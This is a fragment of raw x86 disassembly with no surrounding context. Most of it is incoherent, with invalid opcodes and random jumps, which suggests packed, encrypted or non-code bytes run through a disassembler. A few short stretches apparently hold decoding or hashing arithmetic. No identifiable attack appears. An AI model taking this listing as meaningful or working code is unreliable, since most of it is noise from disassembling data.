  40b256:	je     0x40b268
  40b258:	adc    eax,DWORD PTR [ebp+0x4f]
  40b25b:	mov    bl,0xe5
  40b25d:	hlt    
  40b25e:	jecxz  0x40b246
  40b260:	adc    eax,0x5de6dab
  40b265:	lock mov ds:0xf499919a,al
  40b26b:	cdq    
  40b26c:	mov    edx,0x49cdc6f4
  40b271:	(bad)  
  40b272:	stos   BYTE PTR es:[edi],al
  40b273:	in     eax,dx
  40b274:	sbb    al,0x2b
  40b276:	inc    esp
  40b277:	test   al,0x4
  40b279:	pop    esp
  40b27a:	push   ebp
  40b27b:	ja     0x40b26e
  40b27d:	cli    
  40b27e:	xchg   ecx,eax
  40b27f:	pop    eax
  40b280:	jo     0x40b2b1
  40b282:	clc    
  40b283:	and    al,0x7b
  40b285:	stos   DWORD PTR es:[edi],eax
  40b286:	cmp    esp,edx
  40b288:	mov    al,0x18
  40b28a:	out    0xc2,eax
  40b28c:	jl     0x40b25e
  40b28e:	dec    ebx
  40b28f:	adc    al,0xc9
  40b291:	push   esi
  40b292:	push   ss
  40b293:	or     ch,ah
  40b295:	lea    esi,[esi+0x65a78213]
  40b29b:	adc    al,BYTE PTR [edi+0x3a]
  40b29e:	aad    0x57
  40b2a0:	bound  ebx,QWORD PTR [ecx]
  40b2a2:	xor    ah,dl
  40b2a4:	and    eax,0x96e4c401
  40b2a9:	test   BYTE PTR [ebx-0x7c],0x29
  40b2ad:	leave  
  40b2ae:	test   DWORD PTR [esp+esi*2-0x4b],eax
  40b2b2:	pop    ss
  40b2b3:	jne    0x40b305
  40b2b5:	fisttp DWORD PTR [ebp+edx*4+0x47]
  40b2b9:	mov    dh,0x56
  40b2bb:	push   ds
  40b2bc:	xlat   BYTE PTR ds:[ebx]
  40b2bd:	jge    0x40b2ac
  40b2bf:	ret    0xc550
  40b2c2:	mov    al,0x7
  40b2c4:	ret    0x11c8
  40b2c7:	cwde   
  40b2c8:	mov    dl,0xcf
  40b2ca:	jecxz  0x40b272
  40b2cc:	popf   
  40b2cd:	stos   BYTE PTR es:[edi],al
  40b2ce:	repz pushf 
  40b2d0:	lods   eax,DWORD PTR ds:[esi]
  40b2d1:	sbb    BYTE PTR [edi+0x20d93290],bh
  40b2d7:	(bad)  
  40b2d8:	jbe    0x40b331
  40b2da:	lock push ss
  40b2dc:	inc    eax
  40b2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2de:	dec    edx
  40b2df:	push   edx
  40b2e0:	pop    esi
  40b2e1:	jecxz  0x40b2b7
  40b2e3:	ins    DWORD PTR es:[edi],dx
  40b2e4:	icebp  
  40b2e5:	push   esp
  40b2e6:	adc    BYTE PTR [ecx+0x16],dh
  40b2e9:	dec    ebx
  40b2ea:	outs   dx,DWORD PTR ds:[esi]
  40b2eb:	imul   edi,DWORD PTR [ecx-0x5b],0xffffff83
  40b2ef:	test   cl,cl
  40b2f1:	loop   0x40b2d9
  40b2f3:	inc    ecx
  40b2f4:	jmp    0x1c79:0x5dd68ff3
  40b2fb:	out    dx,al
  40b2fc:	pop    ss
  40b2fd:	push   ds
  40b2fe:	rol    BYTE PTR [ebx-0x10],1
  40b301:	inc    ebp
  40b302:	in     eax,dx
  40b303:	sub    dh,BYTE PTR [edx-0x7e]
  40b306:	shl    ebp,cl
  40b308:	push   esi
  40b309:	scas   eax,DWORD PTR es:[edi]
  40b30a:	sub    BYTE PTR [ecx],ah
  40b30c:	xchg   esp,eax
  40b30d:	int3   
  40b30e:	les    ebp,FWORD PTR [ecx+0x57]
  40b311:	sub    al,0xa0
  40b313:	aam    0x4c
  40b315:	inc    esi
  40b316:	push   ss
  40b317:	mov    edi,0x4b4a1aa9
  40b31c:	or     al,0x4f
  40b31e:	mov    WORD PTR [ecx],gs
  40b320:	in     eax,0xc
  40b322:	aad    0x29
  40b324:	in     al,0xda
  40b326:	push   esp
  40b327:	dec    edx
  40b328:	sub    dl,BYTE PTR [ebx-0x44]
  40b32b:	data16 jmp 0x40b387
  40b32e:	jmp    0x40b34e
  40b330:	cwde   
  40b331:	and    BYTE PTR [esi-0x5e],dh
  40b334:	lahf   
  40b335:	int3   
  40b336:	pop    esi
  40b337:	xor    al,0x6c
  40b339:	enter  0xcdaf,0x45
  40b33d:	pop    ebx
  40b33e:	es clc 
  40b340:	sub    al,0xd0
  40b342:	inc    esi
  40b343:	jmp    0xb0ee7125
  40b348:	retf   0x871a
  40b34b:	lock fild DWORD PTR [ecx]
  40b34e:	pop    esi
  40b34f:	lea    esi,[esi-0x68679a13]
  40b355:	fsqrt  
  40b357:	jmp    0x40b30f
  40b359:	inc    esp
  40b35a:	mov    eax,0xf759f6fb
  40b35f:	out    0x9d,eax
  40b361:	sbb    al,0xbb
  40b363:	fisubr DWORD PTR [esi]
  40b365:	sbb    dh,BYTE PTR [edi]
  40b367:	iret   
  40b368:	mov    ecx,0xcfc308fa
  40b36d:	cwde   
  40b36e:	xchg   ebp,eax
  40b36f:	pop    ebx
  40b370:	dec    eax
  40b371:	ja     0x40b330
  40b373:	into   
  40b374:	jmp    0x9106:0xfe12db79
  40b37b:	sti    
  40b37c:	xor    esp,DWORD PTR [ebx+0x38]
  40b37f:	or     cl,BYTE PTR [edi-0x4d260dbd]
  40b385:	xor    al,0xd5
  40b387:	xchg   edx,eax
  40b388:	mov    ds:0x9736b4df,al
  40b38d:	jae    0x40b37f
  40b38f:	rcl    DWORD PTR ds:0x5b8f4a88,cl
  40b395:	add    edi,DWORD PTR [ebx+0x39]
  40b398:	mov    edi,0xc9470e42
  40b39d:	xchg   ah,al
  40b39f:	push   esi
  40b3a0:	(bad)  
  40b3a1:	in     al,0xe
  40b3a3:	fcomp  DWORD PTR ss:[ecx+0x2629bd14]
  40b3aa:	push   es
  40b3ab:	div    BYTE PTR [ebx+0x2a4beca5]
  40b3b1:	out    0xe4,al
  40b3b3:	xchg   edi,eax
  40b3b4:	adc    ecx,DWORD PTR [ecx-0x8]
  40b3b7:	mov    ah,0xe1
  40b3b9:	test   ebp,eax
  40b3bb:	test   BYTE PTR [edx+0x0],ah
  40b3be:	mov    ecx,0x6a48bba3
  40b3c3:	adc    ch,BYTE PTR [esi]
  40b3c5:	sub    al,BYTE PTR [ebp+0x45fac05c]
  40b3cb:	jmp    0x40b440
  40b3cd:	fsubr  QWORD PTR [esi-0x7e]
  40b3d0:	ret    0x827f
  40b3d3:	ja     0x40b37f
  40b3d5:	out    dx,al
  40b3d6:	jnp    0x40b434
  40b3d8:	xor    esi,eax
  40b3da:	ins    BYTE PTR es:[edi],dx
  40b3db:	sbb    BYTE PTR [edi],cl
  40b3dd:	add    DWORD PTR [edx-0xc10ff52],esi
  40b3e3:	sahf   
  40b3e4:	and    DWORD PTR [ebx+ebx*1+0x52],edi
  40b3e8:	(bad)  
  40b3e9:	sub    al,0x7c
  40b3eb:	test   DWORD PTR [ecx+esi*1+0x2f],edi
  40b3ef:	lea    esi,[si-0x1b00]
  40b3f4:	sub    esp,ebx
  40b3f6:	cli    
  40b3f7:	or     DWORD PTR [eax+0x73],ebx
  40b3fa:	cs stos BYTE PTR es:[edi],al
  40b3fc:	lds    edi,FWORD PTR [edi+ebx*4+0x4ccf22a5]
  40b403:	mov    WORD PTR [eax+eiz*8+0x5d12d545],cs
  40b40a:	xchg   ebp,eax
  40b40b:	jnp    0x40b3b3
  40b40d:	cmp    ebp,edx
  40b40f:	ss pop esi
  40b411:	cmc    
  40b412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b413:	pushf  
  40b414:	ins    DWORD PTR es:[edi],dx
  40b415:	mov    ch,0x82
  40b417:	cwde   
  40b418:	sbb    ch,BYTE PTR [edi+eax*1-0x34]
  40b41c:	pop    edx
  40b41d:	mov    ds:0x1b957a2,eax
  40b422:	dec    esp
  40b423:	push   ds
  40b424:	jo     0x40b471
  40b426:	mov    ah,0xd9
  40b428:	jno    0x40b451
  40b42a:	push   ebp
  40b42b:	pusha  
  40b42c:	xchg   DWORD PTR [ebp+0x73],edi
  40b42f:	and    BYTE PTR [esi-0x64],dl
  40b432:	imul   eax,DWORD PTR [edi],0x5abfdfb4
  40b438:	rcl    BYTE PTR [ecx+0x1b864a41],0xfc
  40b43f:	pop    edi
  40b440:	ins    DWORD PTR es:[edi],dx
  40b441:	jae    0x40b3d8
  40b443:	ret    0xac38
  40b446:	daa    
  40b447:	and    cl,BYTE PTR [esi]
  40b449:	mov    edx,0xc317a7fb
  40b44e:	adc    al,0x8e
  40b450:	or     eax,0xa9273491
  40b455:	dec    esi
  40b456:	jmp    0x48c:0xe755dad1
  40b45d:	xchg   edi,eax
  40b45e:	push   0xf6bf25aa
  40b463:	fmul   DWORD PTR [ebp+0x10facc5]
  40b469:	leave  
  40b46a:	push   edi
  40b46b:	repz les edx,FWORD PTR [eax+ebp*4]
  40b46f:	frstor [ecx]
  40b471:	push   esi
  40b472:	xchg   esi,eax
  40b473:	ja     0x40b4d8
  40b475:	mov    ch,0x82
  40b477:	xchg   edx,eax
  40b478:	inc    esi
  40b479:	out    0x3d,eax
  40b47b:	ret    0x7749
  40b47e:	sbb    ah,BYTE PTR [eax+ebx*1]
  40b481:	mov    ds:0xd850229e,eax
  40b486:	cmp    BYTE PTR [esi],dh
  40b488:	rcl    DWORD PTR ds:0xa83c7fd9,0x6c
  40b48f:	icebp  
  40b490:	jb     0x40b47f
  40b492:	retf   
  40b493:	dec    edx
  40b494:	test   ecx,ebx
  40b496:	loopne 0x40b4ca
  40b498:	jb     0x40b4f9
  40b49a:	pop    eax
  40b49b:	or     esi,DWORD PTR [esi-0x51]
  40b49e:	sub    ebx,DWORD PTR [esi*8-0x372f67c0]
  40b4a5:	adc    al,0x88
  40b4a7:	sub    DWORD PTR [edi],esp
  40b4a9:	imul   ebp,DWORD PTR [edi+edx*2-0x45],0xd45f2697
  40b4b1:	adc    BYTE PTR [edi-0x1fc5f57],0x29
  40b4b8:	mov    edx,0x4e1e23b7
  40b4bd:	test   eax,0x17cdca99
  40b4c2:	inc    edi
  40b4c3:	inc    ecx
  40b4c4:	lea    esp,[edi+0x29]
  40b4c7:	call   0x309e:0x4f644124
  40b4ce:	pop    ebp
  40b4cf:	shr    BYTE PTR [edx-0x59],cl
  40b4d2:	es mov edi,0x7949a61
  40b4d8:	mov    dh,BYTE PTR [edx+0x20540d04]
  40b4de:	cmp    eax,0xf2b44c1d
  40b4e3:	adc    dl,BYTE PTR [edi]
  40b4e5:	xchg   esi,eax
  40b4e6:	sub    esp,DWORD PTR ds:0x9569e08a
  40b4ec:	jp     0x40b4a4
  40b4ee:	neg    bh
  40b4f0:	aas    
  40b4f1:	adc    eax,0x1b543cfe
  40b4f6:	fimul  DWORD PTR [eax+0x22292bcb]
  40b4fc:	mul    ecx
  40b4fe:	jmp    0x8a85:0xe84be9d3
  40b505:	xchg   ecx,eax
  40b506:	add    bh,BYTE PTR fs:[edi+0x3bb2f355]
  40b50d:	pop    es
  40b50e:	mov    edi,0x22aaceae
  40b513:	cli    
  40b514:	inc    edx
  40b515:	or     ch,ch
  40b517:	add    eax,0x460a561f
  40b51c:	stos   BYTE PTR es:[edi],al
  40b51d:	test   eax,0xaf0f0ae2
  40b522:	xlat   BYTE PTR ds:[ebx]
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	mov    DWORD PTR [edi-0x793e1fd9],ebx
  40b555:	jo     0x40b5c7
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b52d
  40b55c:	dec    esi
  40b55d:	sar    ah,0xa4
  40b560:	adc    BYTE PTR es:[esi+0x75dc4fff],cl
  40b567:	inc    edi
  40b568:	mov    bh,0x3c
  40b56a:	xor    BYTE PTR [ebp+eiz*8+0x53e1a61d],al
  40b571:	jae    0x40b522
  40b573:	inc    esi
  40b574:	mov    al,0x2c
  40b576:	ds push eax
  40b578:	cli    
  40b579:	shr    DWORD PTR [esi+0x2a],0x19
  40b57d:	les    ebp,FWORD PTR [edx-0x73]
  40b580:	pop    eax
  40b581:	and    DWORD PTR [ebx],esi
  40b583:	aas    
  40b584:	lds    ebp,FWORD PTR [edx-0x70]
  40b587:	pop    eax
  40b588:	imul   esi,DWORD PTR [ebp+0x65],0x68654a3e
  40b58f:	sbb    dh,BYTE PTR [ebp-0xed5df05]
  40b595:	adc    al,0x43
  40b597:	fisubr WORD PTR [ebp-0x7a]
  40b59a:	mov    DWORD PTR [ecx-0x1763ba80],ecx
  40b5a0:	gs mov bl,0x65
  40b5a3:	sbb    ebx,DWORD PTR [edi+0x44]
  40b5a6:	mov    bl,0x76
  40b5a8:	outs   dx,DWORD PTR ds:[esi]
  40b5a9:	mov    edx,0x4550a4db
  40b5ae:	(bad)  
  40b5af:	in     al,dx
  40b5b0:	sbb    bh,BYTE PTR [ebx+esi*4-0x721cabca]
  40b5b7:	enter  0xa648,0x58
  40b5bb:	imul   edx,edx,0x65
  40b5be:	je     0x40b596
  40b5c0:	enter  0x9b4b,0x26
  40b5c4:	fild   DWORD PTR [ebx-0x538c13c5]
  40b5ca:	xchg   BYTE PTR [edi+0x14],al
  40b5cd:	mov    al,ds:0x3128c4b5
  40b5d2:	adc    ch,dh
  40b5d4:	out    0x67,eax
  40b5d6:	aad    0xc4
  40b5d8:	and    eax,0x31de3a00
  40b5dd:	xchg   ebx,eax
  40b5de:	mov    ds:0x99f8e073,eax
  40b5e3:	sbb    DWORD PTR [edx+eax*8],edx
  40b5e6:	xchg   ebx,eax
  40b5e7:	jbe    0x40b5e0
  40b5e9:	ror    BYTE PTR [edx],1
  40b5eb:	add    BYTE PTR [edi],0x62
  40b5ee:	mov    ds:0x74bb1da6,al
  40b5f3:	mov    ch,0xbe
  40b5f5:	icebp  
  40b5f6:	or     ebp,DWORD PTR [edi-0x3efb548b]
  40b5fc:	call   DWORD PTR [esi+0x36]
  40b5ff:	pop    ecx
  40b600:	loopne 0x40b608
  40b602:	push   esp
  40b603:	sub    bh,BYTE PTR [eax+0x71]
  40b606:	push   eax
  40b607:	imul   esp,eax,0x41
  40b60a:	fs push ss
  40b60c:	mov    ebx,0x740fc4ed
  40b611:	dec    eax
  40b612:	cmc    
  40b613:	leave  
  40b614:	jae    0x40b5c1
  40b616:	mov    ebp,DWORD PTR [edx+0x253e6ea6]
  40b61c:	mov    ah,0x84
  40b61e:	neg    BYTE PTR [eax+edi*8+0x76]
  40b622:	pop    edi
  40b623:	idiv   esp
  40b625:	loopne 0x40b60b
  40b627:	add    al,0xb7
  40b629:	in     eax,0xed
  40b62b:	sbb    eax,0xa1384e73
  40b630:	int    0xd5
  40b632:	stos   BYTE PTR es:[edi],al
  40b633:	mov    bh,0x60
  40b635:	popa   
  40b636:	idiv   BYTE PTR [eax-0x79]
  40b639:	push   esi
  40b63a:	cs cmp bl,ch
  40b63d:	shl    ch,0x8f
  40b640:	pop    ds
  40b641:	enter  0x3cb1,0x31
  40b645:	mov    ah,0x15
  40b647:	adc    dl,dh
  40b649:	dec    esi
  40b64a:	mov    ecx,0x52782bfb
  40b64f:	out    0xc8,eax
  40b651:	cmp    bh,BYTE PTR [edi]
  40b653:	push   ebx
  40b654:	cmc    
  40b655:	and    cl,ch
  40b657:	outs   dx,DWORD PTR ds:[esi]
  40b658:	adc    ebp,edi
  40b65a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b65b:	mov    ch,0xed
  40b65d:	push   eax
  40b65e:	jl     0x40b6d6
  40b660:	jo     0x40b5ef
  40b662:	pop    esp
  40b663:	popa   
  40b664:	enter  0x3441,0xa8
  40b668:	jne    0x40b62f
  40b66a:	xor    eax,0x17ee76d1
  40b66f:	call   0x734352d8
  40b674:	jne    0x40b6bf
  40b676:	in     al,dx
  40b677:	push   eax
  40b678:	xchg   ebp,eax
  40b679:	iret   
  40b67a:	mov    dl,BYTE PTR [edi-0x1a]
  40b67d:	cmp    al,0xff
  40b67f:	nop
  40b680:	clc    
  40b681:	imul   BYTE PTR [ecx+0x25bbdc7f]
  40b687:	pop    esp
  40b688:	mov    ch,0x58
  40b68a:	stc    
  40b68b:	pop    ecx
  40b68c:	std    
  40b68d:	mov    al,ds:0x162bb2b1
  40b692:	xor    BYTE PTR [eax-0x62],bl
  40b695:	sub    cl,BYTE PTR cs:[eax+0x23]
  40b699:	sub    edx,esi
  40b69b:	pop    esi
  40b69c:	shl    cl,cl
  40b69e:	or     al,cl
  40b6a0:	leave  
  40b6a1:	jnp    0x40b696
  40b6a3:	(bad)  
  40b6a4:	pop    esi
  40b6a5:	and    eax,0xd425c0b2
  40b6aa:	loopne 0x40b6ed
  40b6ac:	add    bh,cl
  40b6ae:	cmp    DWORD PTR [esi],esp
  40b6b0:	dec    ebx
  40b6b1:	sub    eax,0x95a694ef
  40b6b6:	stc    
  40b6b7:	ss in  al,0xc3
  40b6ba:	clc    
  40b6bb:	mov    esi,0xf0d74379
  40b6c0:	inc    ecx
  40b6c2:	dec    esp
  40b6c3:	adc    eax,0xbfcf8d0f
  40b6c8:	mov    eax,ds:0xa73c20a9
  40b6cd:	inc    ecx
  40b6ce:	dec    eax
  40b6cf:	stos   DWORD PTR es:[edi],eax
  40b6d0:	sahf   
  40b6d1:	xchg   ebx,eax
  40b6d2:	(bad)  
  40b6d3:	pop    ebp
  40b6d4:	sbb    esi,ebp
  40b6d6:	ja     0x40b6eb
  40b6d8:	inc    eax
  40b6d9:	pushf  
  40b6da:	inc    ebp
  40b6db:	sub    al,0xab
  40b6dd:	into   
  40b6de:	jecxz  0x40b751
  40b6e0:	mov    ah,0x29
  40b6e2:	mov    esp,0x69c5bf75
  40b6e7:	fs (bad) 
  40b6e9:	pop    ebx
  40b6ea:	loop   0x40b672
  40b6ec:	retf   
  40b6ed:	pop    ds
  40b6ee:	or     al,0xbf
  40b6f0:	imul   edi,DWORD PTR [esi-0x7f],0x3d
  40b6f4:	cmp    eax,0xff931d0c
  40b6f9:	sub    al,0x3c
  40b6fb:	ja     0x40b755
  40b6fd:	mov    bh,0x7f
  40b6ff:	out    dx,eax
  40b700:	loop   0x40b68f
  40b702:	pop    esp
  40b703:	dec    ebx
  40b704:	sbb    al,0x9f
  40b706:	loopne 0x40b72b
  40b708:	fcomp  DWORD PTR [ecx+edi*2-0x59]
  40b70c:	scas   al,BYTE PTR es:[edi]
  40b70d:	stc    
  40b70e:	push   0x5f
  40b710:	sti    
  40b711:	xlat   BYTE PTR ds:[ebx]
  40b712:	mov    DWORD PTR [edi],ebp
  40b714:	add    eax,0x2a2310a1
  40b719:	dec    esi
  40b71a:	pop    eax
  40b71b:	repnz mov ebx,0xa49c518c
  40b721:	push   ds
  40b722:	push   ecx
  40b723:	mov    ah,0x7
  40b725:	test   al,0x88
  40b727:	push   ecx
  40b728:	pusha  
  40b729:	mov    dl,0xd7
  40b72b:	stos   DWORD PTR es:[edi],eax
  40b72c:	scas   al,BYTE PTR es:[edi]
  40b72d:	jl     0x40b761
  40b72f:	mov    bh,0xdc
  40b731:	jb     0x40b725
  40b733:	dec    ebp
  40b734:	outs   dx,DWORD PTR ds:[esi]
  40b735:	inc    edi
  40b736:	xchg   edi,eax
  40b737:	aaa    
  40b738:	and    DWORD PTR [ecx+0x52f587ae],0xf73da302
  40b742:	and    eax,DWORD PTR ds:[edx]
  40b745:	mov    ah,0xe5
  40b747:	std    
  40b748:	sub    bl,BYTE PTR [eax+0x22af108]
  40b74e:	xchg   BYTE PTR [eax-0x4ca8bf59],al
  40b754:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b755:	add    DWORD PTR [esi-0x72],edx
  40b758:	rcl    BYTE PTR [edi-0x38],cl
  40b75b:	cmp    BYTE PTR [esi-0x6e9e4d09],0x25
  40b762:	push   es
  40b763:	adc    ah,cl
  40b765:	retf   
  40b766:	(bad)  
  40b767:	sub    al,0x24
  40b769:	push   edx
  40b76a:	jns    0x40b7da
  40b76c:	shr    DWORD PTR [ebx+0x66],0x5e
  40b770:	xchg   ecx,eax
  40b771:	sub    DWORD PTR [edx+0x64],esi
  40b774:	in     eax,dx
  40b775:	jecxz  0x40b784
  40b777:	push   es
  40b778:	fiadd  DWORD PTR [edi]
  40b77a:	push   ebp
  40b77b:	jne    0x40b780
  40b77d:	mov    ebp,0x19576ce9
  40b782:	mov    edi,0x76840ac6
  40b787:	inc    esi
  40b788:	(bad)  
  40b789:	(bad)  
  40b78a:	js     0x40b714
  40b78c:	mov    dl,0x1e
  40b78e:	scas   al,BYTE PTR es:[edi]
  40b78f:	inc    si
  40b791:	das    
  40b792:	sub    edx,esp
  40b794:	pusha  
  40b795:	iret   
  40b796:	mov    al,BYTE PTR [ecx-0x53]
  40b799:	sub    eax,0xae8c98ed
  40b79e:	xor    DWORD PTR [ebp+0x4f],edx
  40b7a1:	xchg   ah,ch
  40b7a3:	cmc    
  40b7a4:	inc    ecx
  40b7a5:	test   DWORD PTR [edx],ebx
  40b7a7:	leave  
  40b7a8:	jno    0x40b780
  40b7aa:	loopne 0x40b7b8
  40b7ac:	dec    eax
  40b7ad:	popa   
  40b7ae:	xchg   ecx,eax
  40b7af:	btr    DWORD PTR [ecx],ebx
  40b7b2:	outs   dx,DWORD PTR ds:[esi]
  40b7b3:	mov    BYTE PTR [ebx+edi*1],dh
  40b7b6:	loope  0x40b81c
  40b7b8:	stos   BYTE PTR es:[edi],al
  40b7b9:	(bad)  
  40b7ba:	cmp    eax,0x69a857c
  40b7bf:	bnd jno 0x40b7b3
  40b7c2:	or     esi,DWORD PTR [ecx+ecx*1+0x1]
  40b7c6:	pop    ecx
  40b7c7:	dec    edx
  40b7c8:	push   eax
  40b7c9:	outs   dx,DWORD PTR ds:[esi]
  40b7ca:	out    0x6c,al
  40b7cc:	enter  0xf4fb,0x4d
  40b7d0:	or     esi,DWORD PTR [ecx+edi*2+0x464e5acb]
  40b7d7:	cld    
  40b7d8:	or     edi,edi
  40b7da:	push   0xfc39f5a3
  40b7df:	inc    eax
  40b7e0:	fimul  DWORD PTR [edx+0x1ff94ab0]
  40b7e6:	enter  0x1a83,0xfe
  40b7ea:	dec    eax
  40b7eb:	dec    esp
  40b7ec:	or     DWORD PTR [edx+ecx*2],edx
  40b7ef:	arpl   WORD PTR [edx-0x55fbafc5],cx
  40b7f5:	scas   eax,DWORD PTR es:[edi]
  40b7f6:	pop    ebx
  40b7f7:	xchg   dh,cl
  40b7f9:	fs retf 
  40b7fb:	pop    ds
  40b7fc:	jecxz  0x40b82f
  40b7fe:	fwait
  40b7ff:	push   0x24
  40b801:	mov    edx,DWORD PTR ds:0xb9ec4d61
  40b807:	cmp    BYTE PTR [ebx],0x39
  40b80a:	mov    edx,0x22200aea
  40b80f:	pusha  
  40b810:	xchg   edx,eax
  40b811:	icebp  
  40b812:	sbb    eax,0x71229ee8
  40b817:	test   BYTE PTR [ebx],dh
  40b819:	sti    
  40b81a:	mov    eax,ss:0x13e2ce33
  40b820:	fwait
  40b821:	add    DWORD PTR [eax+0x70],eax
  40b824:	add    ecx,DWORD PTR [ecx+0x67]
  40b827:	sbb    esp,eax
  40b829:	adc    eax,0x11d2bb68
  40b82e:	xchg   edi,eax
  40b82f:	outs   dx,DWORD PTR ds:[esi]
  40b830:	dec    ebp
  40b831:	call   0x6396:0x68084cce
  40b838:	push   0x6fdf2b8e
  40b83d:	pop    ss
  40b83e:	pushf  
  40b83f:	stos   DWORD PTR es:[edi],eax
  40b840:	xchg   DWORD PTR [ecx+ebp*2-0x41],ebp
  40b844:	sti    
  40b845:	je     0x40b850
  40b847:	xchg   esi,eax
  40b848:	pushf  
  40b849:	mov    al,ss:0xad321097
  40b84f:	or     al,0x87
  40b851:	stos   BYTE PTR es:[edi],al
  40b852:	mov    ds:0x811b943,al
  40b857:	xor    BYTE PTR [ecx+0x51cc4719],0xad
  40b85e:	push   ss
  40b85f:	jo     0x40b838
  40b861:	out    dx,al
  40b862:	xchg   ebp,eax
  40b863:	fadd   QWORD PTR [ebx-0x1e]
  40b866:	mov    esi,0x4652cde6
  40b86b:	pop    edi
  40b86c:	inc    ecx
  40b86d:	imul   esp,DWORD PTR [esi+0x76b7a3d8],0x1
  40b874:	lds    edi,FWORD PTR [eax]
  40b876:	mov    ?,WORD PTR [edi-0x38020c6c]
  40b87c:	jno    0x40b8b0
  40b87e:	jns    0x40b89d
  40b880:	hlt    
  40b881:	cmp    ecx,DWORD PTR [edx+0x5997b990]
  40b887:	or     BYTE PTR [ebx-0x54bf064b],al
  40b88d:	inc    ebx
  40b88e:	scas   eax,DWORD PTR es:[edi]
  40b88f:	loop   0x40b832
  40b891:	jecxz  0x40b85a
  40b893:	jp     0x40b821
  40b895:	shl    BYTE PTR [edx+0x64],0xe4
  40b899:	int3   
  40b89a:	cmp    eax,0xbe85d539
  40b89f:	jle    0x40b918
  40b8a1:	cmp    ch,ah
  40b8a3:	inc    esi
  40b8a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8a5:	cmp    bl,BYTE PTR [ecx+0x6eda4520]
  40b8ab:	loop   0x40b8c6
  40b8ad:	lock pop edi
  40b8af:	fnstenv [esi]
  40b8b1:	int    0xe3
  40b8b3:	lods   al,BYTE PTR ds:[esi]
  40b8b4:	cmp    BYTE PTR [ecx+eax*8],dh
  40b8b7:	ret    
  40b8b8:	push   ebp
  40b8b9:	scas   eax,DWORD PTR es:[edi]
  40b8ba:	lahf   
  40b8bb:	or     al,0xf7
  40b8bd:	mov    al,0xd4
  40b8bf:	inc    eax
  40b8c0:	sbb    edx,ebp
  40b8c2:	les    esp,FWORD PTR [eax]
  40b8c4:	mov    al,ds:0x904e1094
  40b8c9:	inc    esi
  40b8ca:	js     0x40b8c7
  40b8cc:	je     0x40b8f7
  40b8ce:	sti    
  40b8cf:	push   ds
  40b8d0:	xchg   ebp,eax
  40b8d1:	mov    ch,0x6c
  40b8d3:	mov    ch,0xdd
  40b8d5:	inc    ebp
  40b8d6:	loop   0x40b937
  40b8d8:	ret    
  40b8d9:	outs   dx,BYTE PTR ds:[esi]
  40b8da:	out    0xb4,eax
  40b8dc:	loop   0x40b88c
  40b8de:	arpl   WORD PTR [edi+0xe8dfeb8],sp
  40b8e4:	ins    DWORD PTR es:[edi],dx
  40b8e5:	add    eax,0x99013024
  40b8ea:	lea    eax,[edi+ebx*2]
  40b8ed:	xor    bl,BYTE PTR [ebx]
  40b8ef:	mov    cl,0x81
  40b8f1:	outs   dx,BYTE PTR ds:[esi]
  40b8f2:	jl     0x40b96b
  40b8f4:	adc    DWORD PTR [edx+0x3fd17b5f],esp
  40b8fa:	mov    ds:0xfc7d8bcc,eax
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx-0x64359905],cl
  40b949:	(bad)  
  40b94a:	ins    BYTE PTR es:[edi],dx
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b96f
  40b954:	outs   dx,BYTE PTR ds:[esi]
  40b955:	inc    eax
  40b956:	mov    ecx,0xf78e98f2
  40b95b:	les    ebx,FWORD PTR [edx]
  40b95d:	(bad)  
  40b95e:	lock cmp al,0x3a
  40b961:	mov    esp,0x3f6b929d
  40b966:	lahf   
  40b967:	xor    eax,0xbd79ce77
  40b96c:	fnsave [edi-0x6e]
  40b96f:	shl    DWORD PTR [edi],0x9c
  40b972:	sbb    dl,BYTE PTR [esi]
  40b974:	xchg   esi,eax
  40b975:	jns    0x40b909
  40b977:	jmp    0xd2a1be4d
  40b97c:	push   ss
  40b97d:	pop    edi
  40b97e:	pop    es
  40b97f:	and    eax,0x7528662b
  40b984:	in     eax,dx
  40b985:	jbe    0x40b9f4
  40b987:	xor    edx,edx
  40b989:	mov    ebx,0x127c0cfc
  40b98e:	or     BYTE PTR [ebx-0x3],bh
  40b991:	mov    al,0x9d
  40b993:	(bad)  
  40b994:	out    dx,eax
  40b995:	scas   al,BYTE PTR es:[edi]
  40b996:	jno    0x40b930
  40b998:	mov    ds:0x9878e0a6,eax
  40b99d:	sbb    DWORD PTR [edx-0x11],edi
  40b9a0:	shr    BYTE PTR [edx],1
  40b9a2:	iret   
  40b9a3:	sbb    DWORD PTR [ebp-0x43],esp
  40b9a6:	in     eax,0xbf
